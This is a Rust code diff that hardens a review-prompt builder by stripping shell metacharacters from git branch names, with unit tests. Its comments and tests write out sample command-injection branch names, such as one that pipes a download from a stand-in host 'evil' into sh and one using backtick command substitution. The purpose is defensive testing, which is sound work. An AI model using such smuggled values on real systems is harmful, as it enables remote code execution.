@@ -58,16 +58,39 @@ impl ReviewCli {
     }
 }
 
+/// Strip shell-active characters from a git ref before it is interpolated into
+/// the review prompt. The prompt is PRE-FILLED into a terminal; if the chosen
+/// CLI is absent the text lands on a live shell, where the template's backticks
+/// and `$(...)` would execute an attacker-named branch (e.g. `x$(curl evil|sh)`
+/// or `` x`id` ``, both legal git refs reachable via a crafted `.git/HEAD`) as a
+/// command on submit. `parse_head` already drops control bytes for every
+/// consumer; this is the prompt-context guard that additionally removes the
+/// shell metacharacters (`` ` ``, `$`, `;`, `|`, `&`, parens, quotes, ...) which
+/// are legitimate in the sidebar but dangerous here. Keeps the realistic ref
+/// charset: alphanumerics (incl. unicode letters, none of which are shell-active)
+/// plus `/._-+@`.
+fn sanitize_ref_for_prompt(reference: &str) -> String {
+    reference
+        .chars()
+        .filter(|c| c.is_alphanumeric() || matches!(c, '/' | '.' | '-' | '_' | '+' | '@'))
+        .collect()
+}
+
 /// Build the compact, human-in-loop review prompt to PRE-FILL into the CLI input.
 /// The CLI runs in the worktree cwd, so it inspects the diff itself via git —
 /// transparent (you see it run `git diff`) and tiny (no pasted diff). When
 /// `adversarial`, ask it to play the skeptical second reviewer (used for the
 /// 2nd CLI in a multi-CLI "second opinion").
 pub(crate) fn build_cli_review_prompt(branch: &str, base: &str, adversarial: bool) -> String {
+    // Both refs flow into a backtick/`$(...)` template that can reach a live
+    // shell, so neutralize shell metacharacters before interpolation (f001
+    // residual: parse_head strips control bytes but not `` ` ``/`$`).
+    let branch = sanitize_ref_for_prompt(branch);
+    let base = sanitize_ref_for_prompt(base);
     let base = if base.trim().is_empty() {
         "the base branch".to_string()
     } else {
-        base.to_string()
+        base
     };
     let lens = if adversarial {
         "Be a skeptical second reviewer: actively hunt for what a first pass would miss. "
@@ -118,5 +141,38 @@ mod tests {
     fn adversarial_adds_skeptic_framing() {
         let p = build_cli_review_prompt("feat/x", "develop", true);
         assert!(p.contains("skeptical second reviewer"));
+    }
+
+    #[test]
+    fn sanitize_ref_keeps_legit_refs_and_drops_shell_metacharacters() {
+        // Legit refs pass through untouched.
+        assert_eq!(sanitize_ref_for_prompt("feat/x-1.2_3"), "feat/x-1.2_3");
+        assert_eq!(
+            sanitize_ref_for_prompt("release/v0.3.8+meta@1"),
+            "release/v0.3.8+meta@1"
+        );
+        // Shell-active characters are removed.
+        assert_eq!(sanitize_ref_for_prompt("x`id`"), "xid");
+        assert_eq!(sanitize_ref_for_prompt("a$(b);c|d&e"), "abcde");
+    }
+
+    #[test]
+    fn shell_metacharacters_in_branch_do_not_survive_into_prompt() {
+        // f001 residual: a branch named via a crafted `.git/HEAD` (e.g.
+        // `x$(curl evil|sh)`, a legal single-line git ref that survives the
+        // control-byte strip in parse_head) must not reach the prefilled prompt
+        // as live command substitution — the template wraps {branch} in
+        // backticks and the text can land on a live shell if the CLI is absent.
+        let p = build_cli_review_prompt("x$(curl evil.sh|sh)`id`", "main", false);
+        assert!(
+            p.contains("xcurlevil.shshid"),
+            "sanitized branch text should remain, got: {p}"
+        );
+        assert!(!p.contains("$(curl"), "no attacker command substitution");
+        assert!(!p.contains("|sh"), "no pipe-to-shell");
+        assert!(
+            !p.contains("`id`"),
+            "no backtick substitution from the branch"
+        );
     }
 }
